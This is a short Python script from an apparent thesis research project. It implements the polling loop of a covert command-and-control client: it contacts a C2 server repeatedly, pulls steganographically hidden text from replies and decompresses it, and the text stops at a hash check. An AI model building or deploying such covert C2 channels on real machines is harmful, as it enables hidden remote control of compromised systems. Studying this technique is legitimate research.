#I Arnoud Stolk am in no way responsible for how this project is used.
#This project has been created for research purpose.
#The purpose of sharing this sourcecode online is to support my thessis.
#For more information please use https://github.com/arnoudx6/bmga


#Import standard modules
import time

#Import custom modules
import modules.c2 as c2
import modules.stego as stego
import modules.compression as compression

#Initialize script variables
waitingForC2 = True
timeBeforeNextC2Poll = 5

#Creating an endless loop that
firstLoopItteration = True
while waitingForC2:
    if not firstLoopItteration: #<-- If this is not the first itteration in the loop
        #Anounce sleep
        print("Waiting {0} seconds before next C2 poll".format(timeBeforeNextC2Poll))
        time.sleep(timeBeforeNextC2Poll)
        
        #Announce new itteration
        print("New loop itteration")
    else: #<-- If this is the first itteration
        firstLoopItteration = False

    #Check if there is a new C&C message
    print("Contacting C2")
    c2Response = c2.get()
    if not c2Response: #<-- If there is no message from the C&C
        continue #<-- Go to the next loop itteration

    #Extract the embedded text from the stego text response
    success, embeddedText = stego.extractEmbeddedTextFromStegoText("aa", "bb")
    if (not embeddedText) or (not success):
        continue #<-- Go to the next loop itteration

    #Decompress the embedded text
    success, decompressedText = compression.decompress(embeddedText)

    #Check the embedded text hash

